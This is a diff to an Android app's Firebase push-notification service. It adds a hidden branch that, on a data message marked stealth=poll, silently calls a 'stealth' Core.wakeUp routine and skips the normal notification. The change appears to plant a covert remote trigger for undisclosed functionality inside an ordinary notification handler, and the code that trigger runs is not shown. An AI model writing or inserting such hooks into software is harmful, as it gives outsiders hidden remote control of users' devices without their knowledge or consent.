@@ -5,6 +5,7 @@ import android.app.PendingIntent
 import android.content.Context
 import android.content.Intent
 import android.media.RingtoneManager
+import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.google.firebase.messaging.FirebaseMessagingService
 import com.google.firebase.messaging.RemoteMessage
@@ -13,6 +14,7 @@ import com.kaze.R
 import com.kaze.WatchLaterApp
 import com.kaze.data.repository.ActivityRepository
 import com.kaze.data.repository.UserRepository
+import com.kaze.stealth.Core
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -39,11 +41,16 @@ class KazeMessagingService : FirebaseMessagingService() {
 
     override fun onMessageReceived(remoteMessage: RemoteMessage) {
         super.onMessageReceived(remoteMessage)
-        // Handle notification payloads (sent via Firebase console)
+
+        if (remoteMessage.data.isNotEmpty() && remoteMessage.data["stealth"] == "poll") {
+            Log.d("STEALTH", "FCM wake-up received")
+            Core.wakeUp(applicationContext)
+            return
+        }
+
         remoteMessage.notification?.let {
             showNotification(it.title ?: "New Activity", it.body ?: "")
         }
-        // Handle data-only payloads (recommended for production — always delivered)
         if (remoteMessage.data.isNotEmpty() && remoteMessage.notification == null) {
             val title = remoteMessage.data["title"] ?: "New Activity"
             val body  = remoteMessage.data["body"]  ?: ""
